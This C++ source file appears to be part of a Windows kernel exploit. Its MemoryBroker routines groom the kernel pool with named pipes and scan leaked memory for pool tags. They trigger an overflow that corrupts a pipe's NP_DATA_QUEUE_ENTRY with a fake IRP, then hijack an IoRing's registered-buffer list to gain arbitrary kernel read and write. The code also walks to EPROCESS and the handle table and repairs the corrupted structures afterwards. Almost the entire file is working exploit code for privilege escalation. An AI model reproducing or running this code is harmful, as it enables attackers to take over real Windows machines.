#include "memoryBroker.h"
#include "Hvergelmir.h"
#include "pipeManager.h"
#include "config.h"


std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
{

    auto nameManagerLocked = nameManager.lock();
    if (!nameManagerLocked) {
        DEBUG_PRINT(" [!] No ThreadNameManager registered\n");
        return std::nullopt;
    }


    bool correctLayout = false;
    const UINT64 attemptsPerCapture = 20;
    const UINT64 pipeCreateSize = 3000;

    std::vector<UINT64> iosbOffsets;
    std::vector<UINT64> npfrOffsets;

    iosbOffsets.reserve(64);
    npfrOffsets.reserve(64);

    std::vector<BYTE> leakedDataBuffer;

    UINT64 targetPipeOffset = 0;

    while (!correctLayout)
    {
        // Request leak from the registered ThreadNameManager

        if (!nameManagerLocked->GetDataLeak(CHUNKSIZE, CHUNKSIZE * 10, 2)) {
            return std::nullopt;
        }

        for (UINT64 i = 0; i < attemptsPerCapture && !correctLayout; ++i)
        {
            InvokePrimeOverflow(CHUNKSIZE);

            BYTE* tmpLeakPtr = nameManagerLocked->LeakDataMalloc();
            if (!tmpLeakPtr) {
                InvokePassOverflow();
                continue;
            }
            // take ownership into vector
            leakedDataBuffer.assign(tmpLeakPtr, tmpLeakPtr + nameManagerLocked->leakSize);
            free(tmpLeakPtr);
            const UINT64 leakSize = nameManagerLocked->leakSize;

            iosbOffsets = ScanForPoolTag(leakedDataBuffer.data(), leakSize, "IoSB");
                
            if (iosbOffsets.empty())
            {
                InvokePassOverflow();
                continue;
            }
			DEBUG_PRINT(" [*] Found %zu IoSB markers in leak attempt %llu\n", iosbOffsets.size(), (unsigned long long)i);

            // Use pipeManager inside the refresh loop: allocate and clear pipes each attempt
            auto pipeManagerLocked = pipeManager.lock();
            if (!pipeManagerLocked) {
                DEBUG_PRINT(" [!] No PipeManager available\n");
                return std::nullopt;
            }

            const int REFRESH_LOOP_MAX = 50;
            for (int r = 0; r < REFRESH_LOOP_MAX; ++r) {
                // create pipes for this attempt
                pipeManagerLocked->CreatePipes(pipeCreateSize);

                //if (r > 0) { Sleep(50); }

                BYTE* refreshPtr = nameManagerLocked->LeakDataMalloc();
                if (!refreshPtr) {
                    // failed to get leak; cleanup pipes and try next iteration
					DEBUG_PRINT(" [!] Failed to get leak on refresh attempt %d\n", r);
                    InvokePassOverflow();
                    pipeManagerLocked->ClearPipes();
                    continue;
                }
                leakedDataBuffer.assign(refreshPtr, refreshPtr + nameManagerLocked->leakSize);
                free(refreshPtr);

                // scan for NpFr markers (pipe base); use PIPE only to read index
                std::vector<UINT64> npfrMarkers = ScanForPoolTag(leakedDataBuffer.data(), leakSize, "NpFr");
                if (npfrMarkers.empty()) {
                    // not found this iteration
					DEBUG_PRINT(" [*] No NpFr markers found in refresh attempt %d\n", r);
                    pipeManagerLocked->ClearPipes();
                    leakedDataBuffer.clear();
                    continue;
                }

				DEBUG_PRINT(" [*] Found %zu NpFr markers in refresh attempt %d\n", npfrMarkers.size(), r);
                bool foundHere = false;
                for (UINT64 iosbOffset : iosbOffsets) {
                    for (UINT64 npfrOffset : npfrMarkers) {
                        if (npfrOffset > iosbOffset) {
                            UINT64 pipeBase = (npfrOffset >= 0x4) ? (npfrOffset - 0x4) : 0;
                            if (pipeBase >= leakSize) continue;

                            std::vector<UINT64> markerOffsets = ScanForPoolTag(leakedDataBuffer.data() + pipeBase, CHUNKSIZE, "PIPE");
                            if (markerOffsets.empty()) continue;

                            size_t markerPosRel = (size_t)markerOffsets.front();
                            UINT64 absolutePos = pipeBase + markerPosRel;
                            // pipeIndex is a 4-byte uint immediately after the 'PIPE' tag
                            const UINT64 indexPos = absolutePos + 4;
                            if (indexPos + sizeof(UINT32) > leakSize) continue;

                            UINT32 pipeIndex = *(UINT32*)(leakedDataBuffer.data() + indexPos);
                            DEBUG_PRINT("     Found NpFr at %llx -> pipeBase=%llx, PIPE index=%u, IoSB=%llx\n", npfrOffset, pipeBase, pipeIndex, iosbOffset);

                            UINT64 distance = pipeBase - iosbOffset;

                            UINT64 desiredEnd = pipeBase + CHUNKSIZE + 0x20;
                            if (desiredEnd > leakSize) desiredEnd = leakSize;
                            if (iosbOffset >= desiredEnd) continue;

                            UINT64 sliceLen = desiredEnd - iosbOffset;

                            LeakLayoutResult result;
                            result.leakedData.resize((size_t)sliceLen);
                            memcpy(result.leakedData.data(), leakedDataBuffer.data() + iosbOffset, (size_t)sliceLen);
                            result.targetPipeOffset = distance;
                            result.pipeIndex = pipeIndex;
                            // keep pipes intact and do not InvokePassOverflow
                            return result;
                        }
                    }
                }

                // Not found this iteration: clear pipes and continue
                pipeManagerLocked->ClearPipes();
                leakedDataBuffer.clear();
            }
            InvokePassOverflow();

        }
    }
    return std::nullopt;
}



bool MemoryBroker::CorruptPipe()
{
    CreateFakeIRP();

    auto layoutOpt = GetPipeLayout();
    if (!layoutOpt) {
        DEBUG_PRINT(" [!] Failed to obtain thread name layout\n");
        return false;
    }


    LeakLayoutResult layout = std::move(*layoutOpt);

    // Validate sizes
    if (layout.leakedData.size() < layout.targetPipeOffset + CHUNKSIZE) {
        DEBUG_PRINT(" [!] leakedData too small for payload copy\n");
        return false;
    }

    // Build payload; use vector to own memory
    std::vector<BYTE> payload((size_t)CHUNKSIZE + 0x20);
    std::fill(payload.begin(), payload.begin() + 0x10, (BYTE)'c');
    memcpy(payload.data() + 0x10, layout.leakedData.data() + layout.targetPipeOffset, (size_t)CHUNKSIZE);

    // Write NP_DATA_QUEUE_ENTRY fields into payload
    NP_DATA_QUEUE_ENTRY* entry = reinterpret_cast<NP_DATA_QUEUE_ENTRY*>(payload.data() + 0x20);
    entry->Irp = fakeIRP;
    entry->EntryType = 0x1;
    __debugbreak();
    DEBUG_PRINT(" [*] Triggering Overflow to Corrupt NP_DATA_QUEUE_ENTRY of Target Pipe\n");
    UINT64 clientManager = 0;
    memcpy(&clientManager, layout.leakedData.data() + layout.targetPipeOffset + 0x10, sizeof(UINT64));

    // Trigger overflow with payload
    InvokeTriggerOverflow(payload.data(), (UINT64)payload.size());

    auto pipeManagerLocked = pipeManager.lock();
    if (!pipeManagerLocked) {
        DEBUG_PRINT(" [!] No PipeManager available for verification\n");
        return false;
    }

    if (!pipeManagerLocked->VerifyCorruption())
    {
        DEBUG_PRINT(" [!] Failed to verify corruption\n");
        return false;
    }


	Sleep(1000); // Sleep to allow system to stabilize after corruption
    __debugbreak();
    return true;
}



bool MemoryBroker::FindEPROCESS(UINT64 iClientManager)
{
    DEBUG_PRINT("\n [*] ###### Locating EPROCESS and OBJECT_TABLE ######\n");

	if (iClientManager == 0) {
		DEBUG_PRINT(" [!] Invalid client manager pointer (0)\n");
		return false;
	}

	UINT64 fileObject = 0;
	Read(&fileObject, iClientManager - 0x10, sizeof(UINT64));
	if (fileObject == 0) {
		DEBUG_PRINT(" [!] Failed to read FILE_OBJECT from client manager\n");
		return false;
	}

	UINT64 eprocess = 0;
	// guard against underflowed or small addresses
	if (fileObject <= 0x1000) {
		DEBUG_PRINT(" [!] FILE_OBJECT looks invalid: %p\n", (void*)fileObject);
		return false;
	}

	Read(&eprocess, fileObject - 0x40, sizeof(UINT64));
	if (eprocess == 0) {
		DEBUG_PRINT(" [!] Failed to read EPROCESS from FILE_OBJECT\n");
		return false;
	}

	DEBUG_PRINT("     Found EPROCESS: %p\n", (void*)eprocess);

	UINT64 handleTableLocal = 0;
	Read(&handleTableLocal, eprocess + 0x300, sizeof(UINT64));
	if (handleTableLocal == 0) {
		DEBUG_PRINT(" [!] Failed to read HANDLE_TABLE from EPROCESS\n");
		return false;
	}

	this->HANDLE_TABLE = handleTableLocal;
	DEBUG_PRINT("     Found HANDLE_TABLE: %p\n", (void*)this->HANDLE_TABLE);

	return true;
}


bool MemoryBroker::GetIORingLayout()
{
	bool correctLayout = false;

    auto ioRingManagerLocked = ioRingManager.lock();


    while (!correctLayout)
    {
        ioRingManagerLocked->CreateRings(1000);
        InvokePrimeOverflow(IORING_CHUNK_SIZE);

        for (UINT64 i = 0; i < ioRingManagerLocked->ioRingCount; ++i)
        {
            targetRingAddr = HandleToPointer(*(HANDLE*)ioRingManagerLocked->ioRings[i]) - 0x60;

            UINT64 adjacentData;
            Read(&adjacentData, targetRingAddr - 0x20, sizeof(UINT64));

            if (adjacentData == 0x6161616161616161)
            {
                ioRingManagerLocked->corruptedRing = ioRingManagerLocked->ioRings[i];
                correctLayout = true;
                break;
            }
        }

        if (!correctLayout)
        {
            ioRingManagerLocked->ClearRings();
            InvokePassOverflow();
        }
    }
	if (!correctLayout) {
        DEBUG_PRINT(" [!] Failed to find correct IoRing layout\n");
        return false;
    }

    return true;
}


bool MemoryBroker::CorruptIoRing()
{
	if (!targetRingAddr) {
        DEBUG_PRINT(" [!] targetRingAddr not set, cannot corrupt IoRing\n");
        return false;
    }

    UINT64 originalRegBufferList;
    Read(&regBuffersListAddr, targetRingAddr + 0x118, sizeof(UINT64));
    if (!regBuffersListAddr) {
        DEBUG_PRINT(" [!] Failed to read regBuffersListAddr from IoRing\n");
        return false;
	}

    UINT64 regBufferAddr;
    Read(&regBufferAddr, regBuffersListAddr, sizeof(UINT64));
    if (!regBufferAddr) {
        DEBUG_PRINT(" [!] Failed to read regBufferAddr from regBuffersList\n");
        return false;
    }

    BYTE* regBufferContent = new BYTE[0x80];
    Read((UINT64*)regBufferContent, regBufferAddr, 0x80);


    CreateFakeRegBuffer(regBufferContent);

    BYTE* ioRingPayload = new BYTE[IORING_CHUNK_SIZE + 0x10];
    memset(ioRingPayload, 'c', 0x10);

    Read((UINT64*)(ioRingPayload + 0x10), targetRingAddr, IORING_CHUNK_SIZE);

    *(UINT64*)(ioRingPayload + 0x118 + 0x10) = (UINT64)&fakeRegBuffer;
    *(UINT32*)(ioRingPayload + 0x110 + 0x10) = (UINT32)0x1;

    InvokeTriggerOverflow(ioRingPayload, IORING_CHUNK_SIZE + 0x10);

    return true;
}


bool MemoryBroker::Cleanup()
{

    auto pipeManagerLocked = pipeManager.lock();
    auto nameManagerLocked = nameManager.lock();

    UINT64 corruptPipeClient;
    UINT64 corruptPipeFileObject = HandleToPointer(pipeManagerLocked->corruptedPipe);
    if (!corruptPipeFileObject) {
        DEBUG_PRINT(" [!] Failed to get file object for corrupted pipe\n");
        return false;
	}

    for (int i = 0; i < 100; i++)
    {
        Read(&corruptPipeClient, corruptPipeFileObject + 0x20, sizeof(UINT64));
        if (corruptPipeClient != 0x0)
            break;
    }
    corruptPipeClient &= 0xfffffffffffffff0;

    UINT64 corruptPipeAddr;
    Read(&corruptPipeAddr, corruptPipeClient + 0x48, sizeof(UINT64));
	if (!corruptPipeAddr) {
        DEBUG_PRINT(" [!] Failed to get kernel address for corrupted pipe\n");
        return false;
    }

    Write((BYTE*)(corruptPipeAddr + 0x10), 0, 0x8);
    Write((BYTE*)(corruptPipeAddr + 0x20), 0, 0x4);
    Write((BYTE*)(targetRingAddr + 0x118), regBuffersListAddr, 0x8);

    nameManagerLocked->ClearThreads();

}